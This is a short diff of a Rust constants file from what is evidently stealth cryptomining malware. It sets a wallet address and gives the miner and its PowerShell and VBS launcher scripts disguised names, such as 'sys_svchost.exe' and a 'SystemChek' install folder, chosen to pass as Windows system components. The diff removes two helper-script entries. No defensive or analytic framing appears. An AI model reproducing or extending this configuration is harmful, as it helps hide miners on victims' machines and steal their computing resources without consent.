@@ -5,7 +5,5 @@ pub const WALLET: &str = "47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQ
 pub const MINER_EXE_NAME: &str = "sys_svchost.exe";
 pub const CONFIG_NAME: &str = "sys_config.dat";
 pub const MONITOR_SCRIPT: &str = "sys_monitor.ps1";
-pub const HELPER_SCRIPT: &str = "sys_helper.ps1";
 pub const LAUNCHER_SCRIPT: &str = "sys_init.vbs";
-pub const HELPER_LAUNCHER: &str = "sys_check.vbs";
 pub const INSTALL_DIR_NAME: &str = "SystemChek";
